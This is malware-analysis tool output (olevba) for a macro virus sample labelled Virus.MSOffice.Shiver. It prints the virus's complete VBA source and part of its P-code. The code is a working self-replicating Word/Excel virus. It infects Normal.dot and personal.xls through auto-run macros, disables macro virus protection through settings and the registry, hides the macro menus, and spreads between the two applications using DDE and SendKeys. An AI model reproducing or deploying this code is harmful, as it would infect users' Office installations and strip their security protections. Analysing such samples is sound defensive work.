olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSOffice.Shiver
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: ./Virus.MSOffice.Shiver - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foglio1.cls 
in file: ./Virus.MSOffice.Shiver - OLE stream: '_VBA_PROJECT_CUR/VBA/Foglio1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foglio2.cls 
in file: ./Virus.MSOffice.Shiver - OLE stream: '_VBA_PROJECT_CUR/VBA/Foglio2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foglio3.cls 
in file: ./Virus.MSOffice.Shiver - OLE stream: '_VBA_PROJECT_CUR/VBA/Foglio3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: ./Virus.MSOffice.Shiver - OLE stream: '_VBA_PROJECT_CUR/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal strClassName As String, ByVal lpWindowName As Any) As Long
Attribute FindWindow.VB_ProcData.VB_Invoke_Func = " \n14"

Public ExcelFound, WordFound, Marker, JustRun As Boolean

Sub AutoExec()
Attribute AutoExec.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Call WordStealth
If UCase(Dir(Application.StartupPath & "\Word8.dot")) <> "WORD8.DOT" Then
Documents.Add Template:="", NewTemplate:=False
Open "c:\sentry.sys" For Output As 1
Print #1, "Attribute VB_Name = ""Sentry"""
Print #1, "Sub FileSave()"
Print #1, "On Error Resume Next"
Print #1, "If NormalTemplate.VBProject.VBComponents.Item(""Module1"").Name <> ""Module1"" Then"
Print #1, "NormalTemplate.VBProject.VBComponents.Import ""c:\shiver.sys"""
Print #1, "End If"
Print #1, "ActiveDocument.Save"
Print #1, "End Sub"
Close 1
ActiveDocument.VBProject.VBComponents.Import "c:\sentry.sys"
ActiveDocument.SaveAs FileName:=Application.StartupPath & "\Word8.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
Windows("Word8.dot").Close
End If
End Sub

Sub AutoOpen()
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = " \n14"

Dim Set1 As Long

On Error Resume Next

Call wdTrigger

Set1 = &H0

Options.VirusProtection = unimplemented
System.ProfileString("Options", "EnableMacroVirusProtection") = "0"

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = Set1

Options.SaveNormalPrompt = False
Options.ConfirmConversions = False

Application.VBE.ActiveVBProject.VBComponents.Item("Module1").Export "c:\shiver.sys"

AI = True
NI = True

If NormalTemplate.VBProject.VBComponents.Item("Module1").Name <> "Module1" Then NI = False
If ActiveDocument.VBProject.VBComponents.Item("Module1").Name <> "Module1" Then AI = False

Call WordStealth

If NI = False Then
NormalTemplate.VBProject.VBComponents.Import "c:\shiver.sys"
End If

If AI = False Then
ActiveDocument.VBProject.VBComponents.Import "c:\shiver.sys"
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If

End Sub

Sub WordStealth()
Attribute WordStealth.VB_ProcData.VB_Invoke_Func = " \n14"
Yin = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Yin < 4 Then
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString "Sub ToolsMacro()" & vbCr & "End Sub" & vbCr & "Sub FileTemplates()" & vbCr & "End Sub" & vbCr & "Sub ViewVBCode()" & vbCr & "End Sub"
End If
End Sub

Sub AutoExit()
Attribute AutoExit.VB_ProcData.VB_Invoke_Func = " \n14"

Randomize

On Error GoTo out

Call CheckMarker

hWnd = FindApp("XLMain")

If hWnd <> 0 Then ExcelFound = True

If ExcelFound = False And Marker = False Then

Application.WindowState = wdWindowStateMinimize

Call PersonalFun
Shell (Application.Path + "\Excel.exe"), vbMinimizedFocus
Do While ExcelFound = False
    Call FindExcel
Loop

Application.DDETerminateAll

CNL = Application.DDEInitiate("Excel", "system")
Application.DDEExecute CNL, "[New(4)]"
Application.DDETerminate CNL

CNL = Application.DDEInitiate("Excel", "Macro1")
Application.DDEPoke CNL, Item:="R1C1", Data:="=VBA.INSERT.FILE(""c:\shiver.sys"")"
Application.DDEPoke CNL, Item:="R2C1", Data:="=SAVE.AS(""" & Application.Path & "\xlstart\personal.xls"")"
Application.DDEPoke CNL, Item:="R3C1", Data:="=Return()"
DDEExecute channel:=CNL, Command:="[Run(""R1C1"")]"
Application.DDETerminate CNL

CNL = Application.DDEInitiate("Excel", "system")
Application.DDEExecute CNL, "[RUN(""Personal.xls!PXL_Done"")]"
Application.DDETerminate CNL

Call MakeMarker

JustRun = True

End If

out:

If (Int(Rnd * 30) = 5) Then Call wdReEvalInfection

End Sub

Sub FindExcel()
Attribute FindExcel.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
For x = 1 To 50
    w = Tasks.Item(x)
    If Mid(w, 1, 15) = "Microsoft Excel" Then
        ExcelFound = True
        Exit Sub
    End If
Next x
End Sub

Function FindApp(ByVal varClassName As Variant) As Long
Attribute FindApp.VB_ProcData.VB_Invoke_Func = " \n14"
   If IsNull(varClassName) Then
      FindApp = 0
   Else
      FindApp = FindWindow(CStr(varClassName), 0&)
   End If
End Function


Sub PersonalFun()
Attribute PersonalFun.VB_ProcData.VB_Invoke_Func = " \n14"
PSLIVE = Application.Path + "\xlstart\personal.xls"
PS = Dir(PSLIVE)
If "PERSONAL.XLS" = UCase(PS) Then
Kill PSLIVE
End If
End Sub

Sub CheckMarker()
Attribute CheckMarker.VB_ProcData.VB_Invoke_Func = " \n14"
If Application.Application = "Microsoft Word" Then
mkr = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "Shiver[DDE]")
Else
mkr = GetSetting("Office", "8.0", "Shiver[DDE]")
End If
If mkr = "ALT-F11" Then Marker = True
End Sub

Sub MakeMarker()
Attribute MakeMarker.VB_ProcData.VB_Invoke_Func = " \n14"
If Application.Application = "Microsoft Word" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "Shiver[DDE]") = "ALT-F11"
Else
SaveSetting "Office", "8.0", "Shiver[DDE]", "ALT-F11"
End If
End Sub

Sub PXL_Done()
Attribute PXL_Done.VB_ProcData.VB_Invoke_Func = " \n14"
ActiveWindow.Visible = False
Workbooks("personal.xls").Save
Application.Quit
End Sub

Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
Application.OnSheetActivate = "ShiverTime"
End Sub

Sub ShiverTime()
Attribute ShiverTime.VB_ProcData.VB_Invoke_Func = " \n14"

Randomize

On Error Resume Next

Call xlTrigger

If UCase(Mid(ActiveWorkbook.Name, 1, 4)) = "BOOK" Then GoTo out:

Application.VBE.ActiveVBProject.VBComponents.Item("Module1").Export "c:\shiver.sys"

CommandBars("Window").Controls("Unhide...").Enabled = False
CommandBars("Tools").Controls("Macro").Enabled = False

If UCase(Dir(Application.StartupPath + "\personal.xls")) = UCase("personal.xls") Then PXLS = True

For i = 1 To ActiveWorkbook.VBProject.VBComponents.Count
If ActiveWorkbook.VBProject.VBComponents(i).Name = "Module1" Then SXLS = True
Next i

If SXLS = False Then
ActiveWorkbook.VBProject.VBComponents.Import ("c:\shiver.sys")
ActiveWorkbook.Save
End If

If PXLS = False Then
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\personal.xls", FileFormat:=xlNormal, AddToMru:=False
ActiveWorkbook.VBProject.VBComponents.Import ("c:\shiver.sys")
ActiveWindow.Visible = False
Workbooks("personal.xls").Save
End If

out:

If UCase(Dir("c:\o6.reg")) <> "O6.REG" Or UCase(Dir("c:\o6.bat")) <> "O6.BAT" Then

Open "c:\o6.reg" For Output As 1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
Print #1, """Options6""=dword:00000000"
Close 1

Open "c:\o6.bat" For Output As 1
Print #1, "regedit /s c:\o6.reg"
Close 1
End If

End Sub

Sub wdTrigger()
Attribute wdTrigger.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Randomize
Application.EnableCancelKey = wdCancelDisabled
ShowVisualBasicEditor = False
If Int(Rnd * 800) = 601 Then
For x = 1 To 16
Selection.WholeStory
Selection.Range.HighlightColorIndex = x
For y = 1 To 1000000
Next y
If x > 3 Then x = x - Int(Rnd * 3)
Next x
' REM Bad Payload REM
'System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Document.8\shell\open\ddeexec", "") = "[FileExit]"
'System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Excel.Sheet.8\shell\Open\ddeexec", "") = "[FileExit]"
' REM Bad Payload REM
End If
End Sub

Sub xlTrigger()
Attribute xlTrigger.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Randomize
Application.EnableCancelKey = xlDisabled
If Int(Rnd * 800) = 601 Then
For x = 1 To 30
RR = (Chr(65 + Int(Rnd * 12))) & x
Range(RR).AddComment
Range(RR).Comment.Visible = True
Range(RR).Comment.Text Text:="Shiver[DDE] by ALT-F11"
Range(RR).Comment.Shape.Select True
Selection.ShapeRange.IncrementLeft Int(Rnd * 300)
Selection.ShapeRange.IncrementTop Int(Rnd * 300)
Next x
End If
End Sub


Sub Auto_Close()
Attribute Auto_Close.VB_ProcData.VB_Invoke_Func = " \n14"

On Error GoTo out

Call CheckMarker

hWnd = FindApp("OpusApp")

If hWnd <> 0 Then WordFound = True

If WordFound = False And Marker = False Then

Shell Application.Path & "\winword.exe", vbMinimizedFocus
CNL = Application.DDEInitiate("MSWord", "system")
Application.DDEExecute CNL, "[fileclose]"
Application.DDEExecute CNL, "[Sendkeys ""%{F11}""]"
Application.DDEExecute CNL, "[Sendkeys ""^m""]"
Call delay
SendKeys "c:\shiver.sys", Wait
SendKeys "%o"
Application.DDEExecute CNL, "[Sendkeys ""%{F4}""]"
Application.DDEExecute CNL, "[Sendkeys ""%{F4}""]"
Application.DDEExecute CNL, "[Sendkeys ""y""]"
Application.DDETerminate CNL

Call MakeMarker

JustRun = True

End If

out:

On Error Resume Next
Shell "c:\o6.bat", vbHide

If (Int(Rnd * 30) = 5) Then Call xlReEvalInfection

End Sub

Sub delay()
Attribute delay.VB_ProcData.VB_Invoke_Func = " \n14"
newHour = Hour(Now())
newMinute = Minute(Now())
newSecond = Second(Now()) + 2
waitTime = TimeSerial(newHour, newMinute, newSecond)
Application.Wait waitTime
End Sub

Sub wdReEvalInfection()
Attribute wdReEvalInfection.VB_ProcData.VB_Invoke_Func = " \n14"
If UCase(Dir(Application.Path + "\xlstart\personal.xls")) <> "PERSONAL.XLS" And Marker = True And JustRun <> True Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "Shiver[DDE]") = "NoNoNo"
End If
End Sub

Sub xlReEvalInfection()
Attribute xlReEvalInfection.VB_ProcData.VB_Invoke_Func = " \n14"
If UCase(Dir(Application.Path & "\startup\Word8.dot")) <> "WORD8.DOT" And Marker = True And JustRun <> True Then
SaveSetting "Office", "8.0", "Shiver[DDE]", "NoNoNo"
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSOffice.Shiver
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/ThisWorkbook - 965 bytes
' _VBA_PROJECT_CUR/VBA/Foglio1 - 958 bytes
' _VBA_PROJECT_CUR/VBA/Foglio2 - 958 bytes
' _VBA_PROJECT_CUR/VBA/Foglio3 - 958 bytes
' _VBA_PROJECT_CUR/VBA/Module1 - 17341 bytes
' Line #0:
' Line #1:
' Line #2:
' 	FuncDefn (Declare Function FindWindow Lib "user32" (ByVal strClassName As String, ByVal lpWindowName As ) As Long)
' Line #3:
' Line #4:
' 	Dim (Public) 
' 	VarDefn ExcelFound
' 	VarDefn WordFound
' 	VarDefn Marker
' 	VarDefn JustRun (As Boolean)
' Line #5:
' Line #6:
' 	FuncDefn (Sub AutoExec())
' Line #7:
' 	OnError (Resume Next) 
' Line #8:
' 	ArgsCall (Call) WordStealth 0x0000 
' Line #9:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000A "\Word8.dot"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0009 "WORD8.DOT"
' 	Ne 
' 	IfBlock 
' Line #10:
' 	LitStr 0x0000 ""
' 	ParamNamed Template 
' 	LitVarSpecial (False)
' 	ParamNamed NewTemplate 
' 	Ld Documents 
' 	ArgsMemCall Add 0x0002 
' Line #11:
' 	LitStr 0x000D "c:\sentry.sys"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #12:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "Attribute VB_Name = "Sentry""
' 	PrintItemNL 
' Line #13:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Sub FileSave()"
' 	PrintItemNL 
' Line #14:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "On Error Resume Next"
' 	PrintItemNL 
' Line #15:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004F "If NormalTemplate.VBProject.VBComponents.Item("Module1").Name <> "Module1" Then"
' 	PrintItemNL 
' Line #16:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003C "NormalTemplate.VBProject.VBComponents.Import "c:\shiver.sys""
' 	PrintItemNL 
' Line #17:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "End If"
' 	PrintItemNL 
' Line #18:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "ActiveDocument.Save"
' 	PrintItemNL 
' Line #19:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #20:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #21:
' 	LitStr 0x000D "c:\sentry.sys"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #22:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000A "\Word8.dot"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #23:
' 	LitStr 0x0009 "Word8.dot"
' 	ArgsLd Windows 0x0001 
' 	ArgsMemCall Close 0x0000 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	EndSub 
' Line #26:
' Line #27:
' 	FuncDefn (Sub AutoOpen())
' Line #28:
' Line #29:
' 	Dim 
' 	VarDefn Set1 (As Long)
' Line #30:
' Line #31:
' 	OnError (Resume Next) 
' Line #32:
' Line #33:
' 	ArgsCall (Call) wdTrigger 0x0000 
' Line #34:
' Line #35:
' 	LitHI2 0x0000 
' 	St Set1 
' Line #36:
' Line #37:
' 	Ld unimplemented 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #38:
' 	LitStr 0x0001 "0"
' 	LitStr 0x0007 "Options"
' 	LitStr 0x001A "EnableMacroVirusProtection"
' 	Ld System 
' 	ArgsMemSt ProfileString 0x0002 
' Line #39:
' Line #40:
' 	Ld Set1 
' 	LitStr 0x0000 ""
' 	LitStr 0x0045 "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	LitStr 0x0008 "Options6"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #41:
' Line #42:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #43:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #44:
' Line #45:
' 	LitStr 0x000D "c:\shiver.sys"
' 	LitStr 0x0007 "Module1"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #46:
' Line #47:
' 	LitVarSpecial (True)
' 	St AI 
' Line #48:
' 	LitVarSpecial (True)
' 	St NI 
' Line #49:
' Line #50:
' 	LitStr 0x0007 "Module1"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Module1"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St NI 
' 	EndIf 
' Line #51:
' 	LitStr 0x0007 "Module1"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Module1"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St AI 
' 	EndIf 
' Line #52:
' Line #53:
' 	ArgsCall (Call) WordStealth 0x0000 
' Line #54:
' Line #55:
' 	Ld NI 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #56:
' 	LitStr 0x000D "c:\shiver.sys"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #57:
' 	EndIfBlock 
' Line #58:
' Line #59:
' 	Ld AI 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #60:
' 	LitStr 0x000D "c:\shiver.sys"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #61:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #62:
' 	EndIfBlock 
' Line #63:
' Line #64:
' 	EndSub 
' Line #65:
' Line #66:
' 	FuncDefn (Sub WordStealth())
' Line #67:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Yin 
' Line #68:
' 	Ld Yin 
' 	LitDI2 0x0004 
' 	Lt 
' 	IfBlock 
' Line #69:
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0013 "Sub FileTemplates()"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0010 "Sub ViewVBCode()"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	EndSub 
' Line #72:
' Line #73:
' 	FuncDefn (Sub AutoExit())
' Line #74:
' Line #75:
' 	ArgsCall Read 0x0000 
' Line #76:
' Line #77:
' 	OnError out 
' Line #78:
' Line #79:
' 	ArgsCall (Call) CheckMarker 0x0000 
' Line #80:
' Line #81:
' 	LitStr 0x0006 "XLMain"
' 	ArgsLd FindApp 0x0001 
' 	St hWnd 
' Line #82:
' Line #83:
' 	Ld hWnd 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ExcelFound 
' 	EndIf 
' Line #84:
' Line #85:
' 	Ld ExcelFound 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld Marker 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #86:
' Line #87:
' 	Ld wdWindowStateMinimize 
' 	Ld Application 
' 	MemSt WindowState 
' Line #88:
' Line #89:
' 	ArgsCall (Call) PersonalFun 0x0000 
' Line #90:
' 	Ld Application 
' 	MemLd Path 
' 	LitStr 0x000A "\Excel.exe"
' 	Add 
' 	Paren 
' 	Ld vbMinimizedFocus 
' 	ArgsCall Shell 0x0002 
' Line #91:
' 	Ld ExcelFound 
' 	LitVarSpecial (False)
' 	Eq 
' 	DoWhile 
' Line #92:
' 	ArgsCall (Call) FindExcel 0x0000 
' Line #93:
' 	Loop 
' Line #94:
' Line #95:
' 	Ld Application 
' 	ArgsMemCall DDETerminateAll 0x0000 
' Line #96:
' Line #97:
' 	LitStr 0x0005 "Excel"
' 	LitStr 0x0006 "system"
' 	Ld Application 
' 	ArgsMemLd DDEInitiate 0x0002 
' 	St CNL 
' Line #98:
' 	Ld CNL 
' 	LitStr 0x0008 "[New(4)]"
' 	Ld Application 
' 	ArgsMemCall DDEExecute 0x0002 
' Line #99:
' 	Ld CNL 
' 	Ld Application 
' 	ArgsMemCall DDETerminate 0x0001 
' Line #100:
' Line #101:
' 	LitStr 0x0005 "Excel"
' 	LitStr 0x0006 "Macro1"
' 	Ld Application 
' 	ArgsMemLd DDEInitiate 0x0002 
' 	St CNL 
' Line #102:
' 	Ld CNL 
' 	LitStr 0x0004 "R1C1"
' 	ParamNamed Item 
' 	LitStr 0x0021 "=VBA.INSERT.FILE("c:\shiver.sys")"
' 	ParamNamed Data 
' 	Ld Application 
' 	ArgsMemCall DDEPoke 0x0003 
' Line #103:
' 	Ld CNL 
' 	LitStr 0x0004 "R2C1"
' 	ParamNamed Item 
' 	LitStr 0x000A "=SAVE.AS(""
' 	Ld Application 
' 	MemLd Path 
' 	Concat 
' 	LitStr 0x0017 "\xlstart\personal.xls")"
' 	Concat 
' 	ParamNamed Data 
' 	Ld Application 
' 	ArgsMemCall DDEPoke 0x0003 
' Line #104:
' 	Ld CNL 
' 	LitStr 0x0004 "R3C1"
' 	ParamNamed Item 
' 	LitStr 0x0009 "=Return()"
' 	ParamNamed Data 
' 	Ld Application 
' 	ArgsMemCall DDEPoke 0x0003 
' Line #105:
' 	Ld CNL 
' 	ParamNamed channel 
' 	LitStr 0x000D "[Run("R1C1")]"
' 	ParamNamed Command 
' 	ArgsCall DDEExecute 0x0002 
' Line #106:
' 	Ld CNL 
' 	Ld Application 
' 	ArgsMemCall DDETerminate 0x0001 
' Line #107:
' Line #108:
' 	LitStr 0x0005 "Excel"
' 	LitStr 0x0006 "system"
' 	Ld Application 
' 	ArgsMemLd DDEInitiate 0x0002 
' 	St CNL 
' Line #109:
' 	Ld CNL 
' 	LitStr 0x001E "[RUN("Personal.xls!PXL_Done")]"
' 	Ld Application 
' 	ArgsMemCall DDEExecute 0x0002 
' Line #110:
' 	Ld CNL 
' 	Ld Application 
' 	ArgsMemCall DDETerminate 0x0001 
' Line #111:
' Line #112:
' 	ArgsCall (Call) MakeMarker 0x0000 
' Line #113:
' Line #114:
' 	LitVarSpecial (True)
' 	St JustRun 
' Line #115:
' Line #116:
' 	EndIfBlock 
' Line #117:
' Line #118:
' 	Label out 
' Line #119:
' Line #120:
' 	Ld Rnd 
' 	LitDI2 0x001E 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0005 
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) wdReEvalInfection 0x0000 
' 	EndIf 
' Line #121:
' Line #122:
' 	EndSub 
' Line #123:
' Line #124:
' 	FuncDefn (Sub FindExcel())
' Line #125:
' 	OnError (Resume Next) 
' Line #126:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0032 
' 	For 
' Line #127:
' 	Ld x 
' 	Ld Tasks 
' 	ArgsMemLd Item 0x0001 
' 	St w 
' Line #128:
' 	Ld w 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x000F "Microsoft Excel"
' 	Eq 
' 	IfBlock 
' Line #129:
' 	LitVarSpecial (True)
' 	St ExcelFound 
' Line #130:
' 	ExitSub 
' Line #131:
' 	EndIfBlock 
' Line #132:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #133:
' 	EndSub 
' Line #134:
' Line #135:
' 	FuncDefn (Function FindApp(ByVal varClassName As Variant) As Long)
' Line #136:
' 	Ld varClassName 
' 	ArgsLd IsNull 0x0001 
' 	IfBlock 
' Line #137:
' 	LitDI2 0x0000 
' 	St FindApp 
' Line #138:
' 	ElseBlock 
' Line #139:
' 	Ld varClassName 
' 	Coerce (Str) 
' 	LitDI4 0x0000 0x0000 
' 	ArgsLd FindWindow 0x0002 
' 	St FindApp 
' Line #140:
' 	EndIfBlock 
' Line #141:
' 	EndFunc 
' Line #142:
' Line #143:
' Line #144:
' 	FuncDefn (Sub PersonalFun())
' Line #145:
' 	Ld Application 
' 	MemLd Path 
' 	LitStr 0x0015 "\xlstart\personal.xls"
' 	Add 
' 	St PSLIVE 
' Line #146:
' 	Ld PSLIVE 
' 	ArgsLd Dir 0x0001 
' 	St PS 
' Line #147:
' 	LitStr 0x000C "PERSONAL.XLS"
' 	Ld PS 
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	IfBlock 
' Line #148:
' 	Ld PSLIVE 
' 	ArgsCall Kill 0x0001 
' Line #149:
' 	EndIfBlock 
' Line #150:
' 	EndSub 
' Line #151:
' Line #152:
' 	FuncDefn (Sub CheckMarker())
' Line #153:
' 	Ld Application 
' 	MemLd Application 
' 	LitStr 0x000E "Microsoft Word"
' 	Eq 
' 	IfBlock 
' Line #154:
' 	LitStr 0x0000 ""
' 	LitStr 0x0041 "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0"
' 	LitStr 0x000B "Shiver[DDE]"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St mkr 
' Line #155:
' 	ElseBlock 
' Line #156:
' 	LitStr 0x0006 "Office"
' 	LitStr 0x0003 "8.0"
' 	LitStr 0x000B "Shiver[DDE]"
' 	ArgsLd GetSetting 0x0003 
' 	St mkr 
' Line #157:
' 	EndIfBlock 
' Line #158:
' 	Ld mkr 
' 	LitStr 0x0007 "ALT-F11"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Marker 
' 	EndIf 
' Line #159:
' 	EndSub 
' Line #160:
' Line #161:
' 	FuncDefn (Sub MakeMarker())
' Line #162:
' 	Ld Application 
' 	MemLd Application 
' 	LitStr 0x000E "Microsoft Word"
' 	Eq 
' 	IfBlock 
' Line #163:
' 	LitStr 0x0007 "ALT-F11"
' 	LitStr 0x0000 ""
' 	LitStr 0x0041 "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0"
' 	LitStr 0x000B "Shiver[DDE]"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #164:
' 	ElseBlock 
' Line #165:
' 	LitStr 0x0006 "Office"
' 	LitStr 0x0003 "8.0"
' 	LitStr 0x000B "Shiver[DDE]"
' 	LitStr 0x0007 "ALT-F11"
' 	ArgsCall SaveSetting 0x0004 
' Line #166:
' 	EndIfBlock 
' Line #167:
' 	EndSub 
' Line #168:
' Line #169:
' 	FuncDefn (Sub PXL_Done())
' Line #170:
' 	LitVarSpecial (False)
' 	Ld ActiveWindow 
' 	MemSt Visible 
' Line #171:
' 	LitStr 0x000C "personal.xls"
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #172:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #173:
' 	EndSub 
' Line #174:
' Line #175:
' 	FuncDefn (Sub Auto_Open())
' Line #176:
' 	LitStr 0x000A "ShiverTime"
' 	Ld Application 
' 	MemSt OnSheetActivate 
' Line #177:
' 	EndSub 
' Line #178:
' Line #179:
' 	FuncDefn (Sub ShiverTime())
' Line #180:
' Line #181:
' 	ArgsCall Read 0x0000 
' Line #182:
' Line #183:
' 	OnError (Resume Next) 
' Line #184:
' Line #185:
